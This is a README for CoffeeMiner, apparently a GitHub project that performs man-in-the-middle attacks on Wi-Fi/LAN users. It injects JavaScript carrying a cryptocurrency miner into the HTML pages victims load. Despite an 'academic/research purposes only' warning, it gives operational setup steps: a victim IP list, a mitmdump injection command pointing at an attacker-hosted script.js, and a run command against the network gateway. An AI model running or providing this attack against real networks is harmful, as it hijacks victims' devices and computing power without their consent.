# CoffeeMiner

Collaborative (mitm) cryptocurrency mining pool in wifi networks

**Warning: this project is for academic/research purposes only.**


## Concept
- Performs a MITM attack to all selected victims
- Injects a js script in all the HTML pages requested by the victims
- The js script injected contains a cryptocurrency miner
- All the devices victims connected to the Lan network, will be mining for the CoffeeMiner


## Use
- install.sh
```
bash install.sh
```
- edit victims.txt with one IP per line
- edit coffeeMiner.py, line 28, with the coffeeMiner httpserver IP:
```py
os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
```
- run.py
```
python3 coffeeMiner.py ipgateway
```

![network](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/network.png "network")


A complete instructions for academic scenario can be found in https://github.com/arnaucode/coffeeMiner/blob/master/virtualbox_scenario_instructions.md
